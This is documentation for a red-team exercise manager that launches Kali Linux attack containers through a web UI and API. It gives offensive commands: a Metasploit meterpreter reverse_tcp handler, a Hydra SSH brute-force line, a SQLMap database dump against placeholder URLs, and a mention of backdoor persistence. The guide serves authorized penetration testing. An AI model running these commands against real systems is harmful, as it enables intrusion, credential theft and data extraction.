[8m# Kali Linux Integration Guide

## Overview

Your Red Team Exercise Manager now integrates with **Kali Linux containers** to launch real attack operations directly from the web UI. This enables you to:

- Launch nmap network scans
- Deploy Metasploit Framework
- Run SQL injection tests with SQLMap
- Execute custom attack commands
- Track all operations in a centralized dashboard
- Link attacks to exercises for audit trails

## Architecture

```
redteam-pod (Podman Pod)
├── redteam-app (Management UI)
└── Attack Containers (Kali Linux)
    ├── nmap-192-168-1-1-20251019...
    ├── msf-target-20251019...
    ├── sqlmap-http-target-20251019...
    └── custom-exploit-20251019...
```

All containers run in the same pod, sharing the network namespace, making multi-stage attacks seamless.

## Features

### 1. Network Scanning (Nmap)

**Scan Types:**
- **Quick Scan**: Fast port scan (`nmap -F`)
- **Full Port Scan**: All 65535 ports (`nmap -p-`)
- **Stealth Scan**: SYN stealth scan (`nmap -sS -T2`)
- **Service Detection**: Version and script scanning (`nmap -sV -sC`)

**Example:**
```bash
Target: 192.168.1.100
Scan Type: Service Detection
Exercise: ex-20251019-001
```

### 2. Metasploit Framework

Launches an interactive Metasploit console container that you can exec into for exploitation.

**Usage:**
1. Launch from UI with target IP
2. Access container: `podman exec -it msf-<target>-<timestamp> msfconsole`
3. Run exploits, post-exploitation modules
4. Results are logged in the container

**Example Workflow:**
```bash
# From UI: Launch Metasploit targeting 192.168.1.50

# Then from terminal:
podman exec -it msf-192-168-1-50-20251019092800 /bin/bash
msfconsole
> use exploit/multi/handler
> set payload linux/x64/meterpreter/reverse_tcp
> set LHOST 192.168.1.10
> exploit
```

### 3. SQL Injection Testing (SQLMap)

Automated SQL injection detection and exploitation.

**Usage:**
```bash
Target URL: http://victim.com/page.php?id=1
Attack Type: sqlmap
```

SQLMap will:
- Crawl 2 levels deep
- Test all parameters
- Batch mode (no prompts)
- Extract database information

### 4. Custom Attacks

Run any Kali tool or custom command:

**Examples:**
```bash
# Hydra brute force
apt-get update && apt-get install -y hydra && hydra -L users.txt -P pass.txt ssh://192.168.1.100

# Nikto web scanner
apt-get update && apt-get install -y nikto && nikto -h http://target.com

# Custom exploit
apt-get update && apt-get install -y python3-pip && pip3 install requests && python3 exploit.py
```

## Web UI Access

Navigate to: **http://localhost:5172/attacks**

You'll see:
1. **Attack Launch Forms** - Four cards for different attack types
2. **Active Containers Table** - Real-time view of running attacks
3. **Container Actions** - View logs, stop, or delete containers

## API Endpoints

### Launch Attacks

```bash
# Nmap scan
curl -X POST http://localhost:5172/api/attacks/nmap \
  -F "target=192.168.1.1" \
  -F "scan_type=quick" \
  -F "exercise_id=ex-20251019-001"

# Metasploit
curl -X POST http://localhost:5172/api/attacks/metasploit \
  -F "target=192.168.1.50" \
  -F "exercise_id=ex-20251019-001"

# SQLMap
curl -X POST http://localhost:5172/api/attacks/sqlmap \
  -F "target=http://victim.com/page.php?id=1"

# Custom
curl -X POST http://localhost:5172/api/attacks/custom \
  -F "target=192.168.1.100" \
  -F "attack_type=hydra" \
  -F "command=apt-get update && apt-get install -y hydra && hydra -L users.txt -P pass.txt ssh://192.168.1.100"
```

### Manage Containers

```bash
# List all attack containers
curl http://localhost:5172/api/attacks/containers

# Get container logs
curl http://localhost:5172/api/attacks/containers/<container_id>/logs?tail=100

# Stop container
curl -X POST http://localhost:5172/api/attacks/containers/<container_id>/stop

# Delete container
curl -X DELETE http://localhost:5172/api/attacks/containers/<container_id>
```

## Database Tracking

All attack operations are tracked in the `attack_containers` table:

```sql
SELECT
  container_name,
  attack_type,
  target,
  status,
  exercise_id,
  created_at
FROM attack_containers
ORDER BY created_at DESC;
```

## Security Considerations

### ⚠️ WARNING

This system launches **real attack tools**. Use responsibly:

1. **Authorization Required**: Only attack systems you own or have written permission to test
2. **Network Isolation**: Consider running in an isolated network
3. **Audit Logging**: All operations are logged with timestamps and user attribution
4. **Rate Limiting**: API endpoints are rate-limited to prevent abuse
5. **Exercise Linking**: Link attacks to approved exercises for compliance

### Best Practices

1. **Always Link to Exercise**: Associate attacks with approved exercises
2. **Document Scope**: Record target scope in exercise metadata
3. **Monitor Logs**: Regularly review attack container logs
4. **Clean Up**: Remove containers after operations complete
5. **Legal Compliance**: Ensure all activities comply with laws and regulations

## Advanced Usage

### Multi-Stage Attacks

Since all containers share the pod network:

```bash
# Stage 1: Reconnaissance (nmap)
# Launch from UI -> note container ID

# Stage 2: Exploitation (metasploit)
# Access nmap results
podman exec <nmap-container-id> cat /tmp/scan-results.txt

# Use results to configure Metasploit
podman exec -it <msf-container-id> msfconsole

# Stage 3: Persistence (custom)
# Launch custom container with backdoor payload
```

### Viewing Live Logs

```bash
# From terminal
podman logs -f <container-id>

# From UI
# Click "View Logs" button on container row
```

### Interactive Access

```bash
# Get shell in attack container
podman exec -it <container-name> /bin/bash

# Run Kali tools interactively
apt-get install <tool>
<tool> --help
```

## Kali Image Details

**Image**: `docker.io/kalilinux/kali-rolling:latest`
- **Size**: ~1.5GB (first pull)
- **OS**: Debian-based Kali Linux
- **Tools**: Base tools pre-installed, additional tools installed on-demand
- **Updates**: Rolling release, always current

**Pre-installed Tools**:
- nmap (after first use)
- metasploit-framework (after first use)
- sqlmap (after first use)
- Standard Kali utilities

## Troubleshooting

### Container Won't Start

```bash
# Check pod status
podman pod ps

# Check logs
podman logs redteam-app

# Ensure Kali image is pulled
podman pull docker.io/kalilinux/kali-rolling:latest
```

### Tools Not Found

Some tools require installation on first use:

```bash
# The service automatically runs:
apt-get update && apt-get install -y <tool>

# If this fails, check network connectivity
podman exec <container-id> ping -c 3 8.8.8.8
```

### Permission Issues

Containers run as non-root by default (appuser). For privileged operations:

```bash
# Launch with elevated permissions (use sparingly)
podman exec -it --user root <container-id> /bin/bash
```

### Network Connectivity

Containers share the pod network:

```bash
# Test from attack container
podman exec <container-id> ping <target>

# Check pod network
podman inspect redteam-pod | grep IPAddress
```

## Example Workflows

### 1. Full Network Assessment

```bash
# Step 1: Quick scan to find live hosts
Launch nmap (quick) -> 192.168.1.0/24

# Step 2: Deep scan on live hosts
Launch nmap (service) -> 192.168.1.50

# Step 3: View results
podman logs <nmap-container-id>

# Step 4: Exploit vulnerable service
Launch Metasploit -> 192.168.1.50
```

### 2. Web Application Testing

```bash
# Step 1: SQL injection test
Launch SQLMap -> http://webapp.com/page.php?id=1

# Step 2: Review findings
View Logs -> Check for vulnerable parameters

# Step 3: Manual exploitation
Launch Custom ->
  Command: sqlmap -u "http://webapp.com/page.php?id=1" --dump --batch
```

### 3. Coordinated Red Team Exercise

```bash
# Create exercise first
Exercise: "Network Penetration Test Q1 2025"
Exercise ID: ex-20251019-001

# Launch all attacks linked to exercise
1. Nmap scan (recon) -> exercise_id=ex-20251019-001
2. Metasploit (exploit) -> exercise_id=ex-20251019-001
3. Custom persistence -> exercise_id=ex-20251019-001

# Generate report
SELECT * FROM attack_containers WHERE exercise_id='ex-20251019-001';
```

## Performance

- **Concurrent Containers**: Limited by system resources
- **Container Startup**: 5-30 seconds (depending on tool installation)
- **Resource Usage**: ~500MB RAM per container average
- **Network Performance**: Native (shared pod network)

## Next Steps

1. **Access the Attacks page**: http://localhost:5172/attacks
2. **Start with Nmap**: Run a quick scan against a test target
3. **Review logs**: Check container output in real-time
4. **Create exercises**: Link attacks to formal exercise IDs
5. **Explore custom attacks**: Deploy specialized tools as needed

## Additional Resources

- Kali Linux Documentation: https://www.kali.org/docs/
- Metasploit Unleashed: https://www.offensive-security.com/metasploit-unleashed/
- Nmap Reference: https://nmap.org/book/man.html
- SQLMap Wiki: https://github.com/sqlmapproject/sqlmap/wiki

---

**Remember**: With great power comes great responsibility. Only attack systems you are authorized to test.
[0m